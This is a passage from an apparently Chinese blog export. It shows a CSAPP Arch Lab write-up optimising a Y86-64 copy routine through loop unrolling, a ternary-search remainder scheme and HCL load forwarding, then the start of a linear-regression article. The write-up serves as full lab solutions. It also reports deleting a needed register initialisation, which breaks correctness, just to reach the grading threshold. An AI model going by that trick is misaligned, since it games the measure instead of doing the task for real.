$3,%rdx\n\tjg Loop\n\tret\n\nLoop:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\tiaddq $8, %rdi\t\t# src++\n\tiaddq $8, %rsi\t\t# dst++\n\tiaddq $-1, %rdx\t\t# len--\n\tjg Loop\t\t\t# if so, goto Loop:\n\tret\n\nLoop3:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $24, %rdi\t\t# src++\n\tiaddq $24, %rsi\t\t# dst++\n\tiaddq $-3, %rdx\t\t# len--\n\tjg Loop3\t\t\t# if so, goto Loop\n\tiaddq $3, %rdx\n\tjg Loop\n\tret\n\nLoop10:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 24(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 24(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 40(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 40(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 48(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 48(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 56(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 56(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 64(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 64(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 72(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 72(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $80, %rdi\t\t# src++\n\tiaddq $80, %rsi\t\t# dst++\n\tiaddq $-10, %rdx\t\t# len--\n\tjge Loop10\t\t\t# if so, goto Loop\n\tiaddq $7,%rdx\n\tjge Loop3\n\tiaddq $3,%rdx\n\tjg Loop\n\tret\n```\n\n我们的 CPE 从 8.85 进步到了 8.62\n\n后续仍然毫无头绪了。于是我参考了这篇文章[^2] 。这篇文章指出，当前主要的瓶颈就是，循环展开后，剩余的散的元素的处理比较耗时。其实我们上面进行了两三次的循环展开都是为了处理这个情况。\n\n对于 $k$ 阶循环展开，我们最后剩余的元素数量一定是 $0\\sim k-1$ 的。一个想法就是，我想把更新 `dst` 、 `src`、`%rdx` 的指令去掉，做法就是根据剩余元素的数量，把循环拆开，之前我们已经考虑过，但当时考虑的是跳表，无法实现。这篇文章作者提出其实可以使用 `push` + `ret` 的手段来实现跳转到动态的地址处。不过这种方法的话可能反而增加了 CPE。\n\n于是这篇文章的作者提出，可以使用三叉搜索树来解决。不用二叉搜索树的原因是导致指令数增加。三叉搜索树每个父节点有三个子节点，分别对应于小于父节点，等于父节点，大于父节点。\n\n现在考虑 9 阶循环展开（10 阶循环展开的话代码长度会超出限制），那么我们相当于是将一个数字在 $0\\sim 8$ 这些数字里面搜索。建立如下的三叉搜索树：\n\n![](http://pic.caiwen.work/i/2025/07/30/688a138b5808b.png)\n\n每个节点的高度意味着需要几次询问，或者说是几次跳转才能到达。由于分支预测错误的惩罚不小，所以我们肯定是希望询问次数尽可能小。考虑测试的时候，给出的数组的长度是从 0 开始连续往上增的，因此我们把数字小的高度调低点，这样应该是尽可能优的。\n\n于是就有了如下的代码。注意我们用到了点优化代码长度的小技巧，比如跳到 6？的时候，说明当前数字最小也是 4，所以我们可以直接进行四次操作，而不必把非要搜到叶子节点才进行这四个操作。\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tiaddq $-9,%rdx\n\tjge Loop9\n\tiaddq $6,%rdx\n\nRoot:\n\tjl Q1\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tandq %rdx,%rdx\n\tjg Q2\n\n\tret\n\nQ1:\n\tiaddq $2,%rdx\n\tjl Done\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tandq %rdx,%rdx\n\tje Done\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tret\n\nQ2:\n\tmrmovq 24(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 24(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $-3,%rdx\n\tjl Q3\n\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 40(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 40(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tandq %rdx,%rdx\n\tjg Q4\n\tret\n\nQ3:\n\tiaddq $2,%rdx\n\tje Done\n\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tret\n\nQ4:\n\tmrmovq 48(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 48(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $-1,%rdx\n\tje Done\n\n\tmrmovq 56(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 56(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tret\n\nLoop9:\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 24(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 24(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 40(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 40(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 48(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 48(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 56(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 56(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tmrmovq 64(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 64(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $72, %rdi\t\t# src++\n\tiaddq $72, %rsi\t\t# dst++\n\tiaddq $-9, %rdx\t\t# len--\n\tjge Loop9\t\t\t# if so, goto Loop\n\tiaddq $6,%rdx\n\tjmp Root\n```\n\nCPE 从 8.62 进步到了 8.22，虽然也是不小的进步，但是相比上面文章作者将近 7.5 的 CPE 还是差了很多。我观察到上面参考的两篇文章都直接使用条件跳转而没有使用条件传送。按理说使用条件传送应该更优。不过我又考虑，使用条件传送的话，消耗的指令就都是一样的。但是使用条件分支，如果预测成功的话，那么就能减少指令数量，预测失败的话会带来惩罚，但其实也就两个指令的惩罚，均摊下来可能还是比条件传送好一点。所以我又把代码改用条件分支。不过改的时候有一个注意点，你还是需要避免 加载/使用 冒险。我这里打算让两个位置的数组拷贝交叉进行，但是如果数量是单数，还是会出现一个 加载/使用冒险，但是加载/使用冒险不去除的话，条件传送改成条件跳转收益就不大了，所以仍保留条件传送：\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tiaddq $-9,%rdx\n\tjge Loop9\n\tiaddq $6,%rdx\n\nRoot:\n\tjl Q1\n\tmrmovq (%rdi), %r10\t# read val from src...\n\tmrmovq 8(%rdi), %r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\trmmovq %r11, 8(%rsi)\n\tandq %r10,%r10\n\tjle Next01\n\tiaddq $1,%rax\nNext01:\n\tandq %r11, %r11\n\tjle Next02\n\tiaddq $1,%rax\nNext02:\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tandq %rdx,%rdx\n\tjg Q2\n\n\tret\n\nQ1:\n\tiaddq $2,%rdx\n\tjl Done\n\tmrmovq (%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, (%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tandq %rdx,%rdx\n\tje Done\n\n\tmrmovq 8(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 8(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tret\n\nQ2:\n\tmrmovq 24(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 24(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $-3,%rdx\n\tjl Q3\n\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\tmrmovq 40(%rdi), %r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\trmmovq %r11, 40(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle Next21\n\tiaddq $1,%rax\nNext21:\n\tandq %r11, %r11\t\t# val <= 0?\n\tjle Next22\n\tiaddq $1,%rax\nNext22:\n\n\tandq %rdx,%rdx\n\tjg Q4\n\tret\n\nQ3:\n\tiaddq $2,%rdx\n\tje Done\n\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tret\n\nQ4:\n\tmrmovq 48(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 48(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $-1,%rdx\n\tje Done\n\n\tmrmovq 56(%rdi), %r10\t# read val from src...\n\trrmovq %rax,%r11\n\trmmovq %r10, 56(%rsi)\t# ...and store it to dst\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tret\n\nLoop9:\n\tmrmovq (%rdi), %r10\n\tmrmovq 8(%rdi), %r11\n\trmmovq %r10, (%rsi)\n\trmmovq %r11, 8(%rsi)\n\tandq %r10, %r10\n\tjle Next91\n\tiaddq $1,%rax\nNext91:\n\tandq %r11, %r11\n\tjle Next92\n\tiaddq $1,%rax\nNext92:\n\n\tmrmovq 16(%rdi), %r10\t# read val from src...\n\tmrmovq 24(%rdi), %r11\n\trmmovq %r10, 16(%rsi)\t# ...and store it to dst\n\trmmovq %r11, 24(%rsi)\n\tandq %r10, %r10\n\tjle Next93\n\tiaddq $1,%rax\nNext93:\n\tandq %r11, %r11\n\tjle Next94\n\tiaddq $1,%rax\n\nNext94:\n\tmrmovq 32(%rdi), %r10\t# read val from src...\n\tmrmovq 40(%rdi), %r11\n\trmmovq %r10, 32(%rsi)\t# ...and store it to dst\n\trmmovq %r11, 40(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle Next95\n\tiaddq $1,%rax\nNext95:\n\taddq %r11,%r11\n\tjle Next96\n\tiaddq $1,%rax\nNext96:\n\n\tmrmovq 48(%rdi), %r10\t# read val from src...\n\tmrmovq 56(%rdi), %r11\n\trmmovq %r10, 48(%rsi)\t# ...and store it to dst\n\trmmovq %r11, 56(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle Next97\n\tiaddq $1,%rax\nNext97:\n\tandq %r11, %r11\t\t# val <= 0?\n\tjle Next98\n\tiaddq $1,%rax\nNext98:\n\n\tmrmovq 64(%rdi), %r10\n\trrmovq %rax,%r11\n\trmmovq %r10, 64(%rsi)\n\tiaddq $1,%r11\n\tandq %r10, %r10\t\t# val <= 0?\n\tcmovg %r11,%rax\n\n\tiaddq $72, %rdi\t\t# src++\n\tiaddq $72, %rsi\t\t# dst++\n\tiaddq $-9, %rdx\t\t# len--\n\tjge Loop9\t\t\t# if so, goto Loop\n\tiaddq $6,%rdx\n\tjmp Root\n```\n\nCPE 从 8.22 优化到 7.83。距离满分还差一步\n\n我们观察到上述代码中，剩余的条件传送还是比较多。后来发现上面文章中评论区网友的提示说，可以根据书上的练习题 4.57 进行优化。\n\n书上的 练习题4.57 指出了这样的一个优化方法，对于 加载/使用冒险，如果后一条指令需要的寄存器的数据仅仅是为了再写入内存，例如 `rmmovq` 和 `pushq` ，那么我们可以有一个加载转发技术。\n\n![](http://pic.caiwen.work/i/2025/07/31/688ae7416ceda.png)\n\n前一个指令在访存阶段取出数据后，后一个指令可以直接将其转发到 `M_valA` 上以替代原来的 `valA`\n\n注意的是，并非所有的加载/使用冒险都可以使用加载转发技术优化。如果一条指令获取寄存器的数据是为了将其进行运算，那么就不能使用。所以我们发现只有 `rmmovq` 和 `pushq` 两个指令是可以的。\n\n然后我们仍然注意，`rmmovq` 的 `rB` 是用来计算内存地址的，`pushq` 虽然没有 `rB`，但是在译码阶段计算出的 `srcB` 是 `%rsp`，也是要参与执行阶段的运算。所以我们只能将加载转发作用在这两个的 `rA` 上。\n\n所以我们得到了加载转发的条件：`E_icode in { IPUSHQ, IRMMOVQ } && E_srcA == M_dstM && E_srcB != M_dstM`\n\n修改 HCL：\n\n```\nword e_valA = [\n\t# 判定是否可以进行加载转发\n\tE_icode in { IPUSHQ, IRMMOVQ } && E_srcA == M_dstM && E_srcB != M_dstM: m_valM;\n\t1 : E_valA;  # Use valA from stage pipe register\n];\n\nbool F_stall =\n\t# Conditions for a load/use hazard\n\tE_icode in { IMRMOVQ, IPOPQ } &&\n\t E_dstM in { d_srcA, d_srcB } &&\n\t !(D_icode in { IPUSHQ, IRMMOVQ } && d_srcA == E_dstM && d_srcB != E_dstM) ||\n\t# Stalling at fetch while ret passes through pipeline\n\tIRET in { D_icode, E_icode, M_icode };\n\n# Should I stall or inject a bubble into Pipeline Register D?\n# At most one of these can be true.\nbool D_stall =\n\t# Conditions for a load/use hazard\n\tE_icode in { IMRMOVQ, IPOPQ } &&\n\t E_dstM in { d_srcA, d_srcB } &&\n\t !(D_icode in { IPUSHQ, IRMMOVQ } && d_srcA == E_dstM && d_srcB != E_dstM);\n\n# Should I stall or inject a bubble into Pipeline Register E?\n# At most one of these can be true.\nbool E_stall = 0;\nbool E_bubble =\n\t# Mispredicted branch\n\t(E_icode == IJXX && !e_Cnd) ||\n\t# Conditions for a load/use hazard\n\tE_icode in { IMRMOVQ, IPOPQ } &&\n\t E_dstM in { d_srcA, d_srcB } &&\n\t !(D_icode in { IPUSHQ, IRMMOVQ } && d_srcA == E_dstM && d_srcB != E_dstM);\n```\n\n然后我们就能把代码中所有的条件传送删掉了\n\n不过随后又发现代码大小又超出限制了。于是又在这里卡了一会...后面我参考这篇文章[^3]，发现其用到了一个代码优化技巧。我们可以把最后处理余数的部分的代码串起来，在三叉搜索树搜索到的时候直接跳到对应位置\n\n```assembly\n\t# Loop header\n\txorq %rax,%rax\t\t# count = 0;\n\tiaddq $-9,%rdx\n\tjge P9\n\nRoot:\n\tiaddq $6,%rdx\n\tjl Q1\n\tjg Q2\n\tjmp R3\nQ1:\n\tiaddq $2,%rdx\n\tje R1\n\tjg R2\n\tret\nQ2:\n\tiaddq $-3,%rdx\n\tjl Q3\n\tjg Q4\n\tjmp R6\nQ3:\n\tiaddq $2,%rdx\n\tje R4\n\tjmp R5\nQ4:\n\tiaddq $-1,%rdx\n\tje R7\n\tjmp R8\n\nP9:\n\tmrmovq 64(%rdi), %r10\n\trmmovq %r10, 64(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P8\n\tiaddq $1,%rax\nP8:\n\tmrmovq 56(%rdi), %r10\n\trmmovq %r10, 56(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P7\n\tiaddq $1,%rax\nP7:\n\tmrmovq 48(%rdi), %r10\n\trmmovq %r10, 48(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P6\n\tiaddq $1,%rax\nP6:\n\tmrmovq 40(%rdi), %r10\n\trmmovq %r10, 40(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P5\n\tiaddq $1,%rax\nP5:\n\tmrmovq 32(%rdi), %r10\n\trmmovq %r10, 32(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P4\n\tiaddq $1,%rax\nP4:\n\tmrmovq 24(%rdi), %r10\n\trmmovq %r10, 24(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P3\n\tiaddq $1,%rax\nP3:\n\tmrmovq 16(%rdi), %r10\n\trmmovq %r10, 16(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P2\n\tiaddq $1,%rax\nP2:\n\tmrmovq 8(%rdi), %r10\n\trmmovq %r10, 8(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P1\n\tiaddq $1,%rax\nP1:\n\tmrmovq (%rdi), %r10\n\trmmovq %r10, (%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle P0\n\tiaddq $1,%rax\nP0:\n\tiaddq $72, %rdi\t\t# src++\n\tiaddq $72, %rsi\t\t# dst++\n\tiaddq $-9, %rdx\t\t# len--\n\tjge P9\t\t\t# if so, goto Loop\n\tjmp Root\n\n#----------------------------------------------\n\nR9:\n\tmrmovq 64(%rdi), %r10\n\trmmovq %r10, 64(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R8\n\tiaddq $1,%rax\nR8:\n\tmrmovq 56(%rdi), %r10\n\trmmovq %r10, 56(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R7\n\tiaddq $1,%rax\nR7:\n\tmrmovq 48(%rdi), %r10\n\trmmovq %r10, 48(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R6\n\tiaddq $1,%rax\nR6:\n\tmrmovq 40(%rdi), %r10\n\trmmovq %r10, 40(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R5\n\tiaddq $1,%rax\nR5:\n\tmrmovq 32(%rdi), %r10\n\trmmovq %r10, 32(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R4\n\tiaddq $1,%rax\nR4:\n\tmrmovq 24(%rdi), %r10\n\trmmovq %r10, 24(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R3\n\tiaddq $1,%rax\nR3:\n\tmrmovq 16(%rdi), %r10\n\trmmovq %r10, 16(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R2\n\tiaddq $1,%rax\nR2:\n\tmrmovq 8(%rdi), %r10\n\trmmovq %r10, 8(%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle R1\n\tiaddq $1,%rax\nR1:\n\tmrmovq (%rdi), %r10\n\trmmovq %r10, (%rsi)\n\tandq %r10, %r10\t\t# val <= 0?\n\tjle Done\n\tiaddq $1,%rax\n```\n\n注意我们没有选择去复用前面循环展开的代码，因为这么做的话会使得每次处理完余数之后都要再跑一遍 `P0` 那个位置的代码。这样的话反而会让 CPE 升到 8 以上。\n\n这么做之后 CPE 从 7.83 优化到了 7.54，距离满分仍然还有一段距离。\n\n后面我又在网上搜索了很多讲解本实验的文章，还可用的手段基本是：在 HCL 中添加对于 `ret` 指令和对分支预测失败时的优化（后者我们上面就提到过。不过由于本章模拟器有点问题，这么做不可行，除非修改模拟器的代码，但实验其实不允许这么做），使用十阶循环展开（目前我的代码光是添加十阶循环展开的代码就已经超出限制了，而且我并没有发现当前代码还有哪里可以继续优化。我怀疑这种做法是假的）。\n\n后来我发现很多人把开头的 `xorq %rax,%rax` 删除了。一开始我认为这种优化是不行的，因为这样做的话 ncopy 这个函数其实就是错的，而且我感觉这个小优化应该作用不大。但我试了一下，没想到 CPE 直接从 7.54 优化到 7.47，获得满分。虽然我个人不太认可这样做，但也没什么别的好办法了，本次实验就告一段落....\n\n[^1]: [csapp-Archlab | Little csd's blog](https://littlecsd.net/2019/01/18/csapp-Archlab/)\n\n[^2]: [csapp archlab Part C - 知乎](https://zhuanlan.zhihu.com/p/33751460)\n\n[^3]: [csapp archlab 60分解答 - 知乎](https://zhuanlan.zhihu.com/p/77072339)\n\n","summary":"本章介绍了Y86-64指令集和HCL硬件控制语言，详细讲解了指令的六个处理阶段（取指、译码、执行、访存、写回、更新PC）及其流水线实现，包括控制冒险、数据冒险和异常处理，并通过ArchLab实验优化处理器性能，最终实现CPE为7.47。","key":["csapp","arch lab","体系架构","流水线","cpu","指令集"],"tags":[],"path":["os","csapp","CSAPP第四章 - 处理器体系架构.md"],"background":"http://pic.caiwen.work/i/2025/09/05/68bafb018b40f.png","recommend":false,"status":"published"},{"type":"Article","title":"深度学习-线性神经网络","id":"dl_linear","createTime":"2025-07-06T08:19:00.000Z","updateTime":"2025-09-05T13:34:05.495Z","content":"\n## 1 线性回归\n\n### 1.1 问题定义\n\n给定 $n$ 维输入 $\\mathbf{x}=\\begin{bmatrix} x_1,x_2,\\dots,x_n \\end{bmatrix}^T$\n\n需要确定一个 $n$ 维权重 $\\mathbf{w}=\\begin{bmatrix} w_1,w_2,\\dots,w_n \\end{bmatrix}^T$ 和一个标量偏差 $b$\n\n输出一个预测值 $y=w_1x_1+w_2x_2+\\dots+w_nx_n+b=\\left \\langle \\mathbf{w},\\mathbf{x} \\right \\rangle + b$\n\n平方损失：$\\ell (y,\\hat{y})=\\frac{1}{2}(y-\\hat{y})^2$，其中 $y$ 是真实值，$\\hat{y}$ 是估计值\n\n然后我们有训练数据：\n\n- $\\mathbf{X}=\\begin{bmatrix} \\mathbf{x}_1,\\mathbf{x}_2,\\dots,\\mathbf{x}_n \\end{bmatrix}^T$，表示样本数据的输入，$\\mathbf{x}_i$ 是一个列向量。合成一个矩阵后转置之后，矩阵的每一行就是一个样本数据\n- $\\mathbf{y}=\\begin{bmatrix} y_1,y_2,\\dots,y_n \\end{bmatrix}$ 为样本的输出数据\n\n有损失函数\n\n$$\n\\ell (\\mathbf{X},\\mathbf{y},\\mathbf{w},b)=\\frac{1}{2n}\\sum_{i=1}^n(y_i-\\left \\langle \\mathbf{x}_i,\\mathbf{w} \\right \\rangle-b)^2=\\frac{1}{2n}||\\mathbf{y}-\\mathbf{Xw}-b||^2\n$$\n\n可以把 $b$ 给合并进 $\\mathbf{Xw}$ 中，方法是给 $\\mathbf{X}$ 附加一列元素全为 $b$ 的列向量，然后给行向量 $\\mathbf{w}$ 的最后加一个元素 $1$。然后就可以合并成：\n\n$$\n\\ell (\\mathbf{X},\\mathbf{y},\\mathbf{w})=\\frac{1}{2n}||\\mathbf{y}-\\mathbf{Xw}||^2\n$$\n\n然后选取最合适的 $\\mathbf{w}$ 和 $b$ 来使损失函数最小\n\n### 1.2 梯度下降\n\n挑选一个初始值 $\\mathbf{w}_0$，然后重复迭代参数 $t$，$\\mathbf{w}_t=\\mathbf{w}_{t-1}-\\eta\\frac{\\partial \\ell}{\\partial \\mathbf{w}_{t-1}}$。其中 $\\eta$ 为学习率，是一个需要认为设置的参数，不能太大也不能太小。\n\n![](http://pic.caiwen.work/i/2025/07/06/686a5542dae72.png)\n\n在整个训练集上计算梯度耗时很长，我们可以随机采样 $b$ 个样本 $i_1,i_2,\\dots,i_b$ 来近似损失：\n\n$$\n\\frac{1}{b}\\sum_{i\\in I_b} \\ell(\\mathbf{x}_i,y_i,\\mathbf{w})\n$$\n\n```python\nimport random\nimport torch\nfrom matplotlib import pyplot as plt\nfrom matplotlib_inline import backend_inline\n\n# 生成噪声数据\ndef synthetic_data(w, b, count):\n    X = torch.normal(0, 1, (count, len(w)))\n    y = torch.matmul(X, w) + b\n    y += torch.normal(0, 0.1, y.shape) # 加噪声\n    return X, y.reshape((-1, 1))\n\ntrue_w = torch.tensor([2, -3.4])\ntrue_b = 4.2\nfeatures, labels = synthetic_data(true_w, true_b, 10000)\n# plt.scatter(features[:, 1].detach().numpy(), labels.detach().numpy(), 1)\n# plt.show()\n\n# 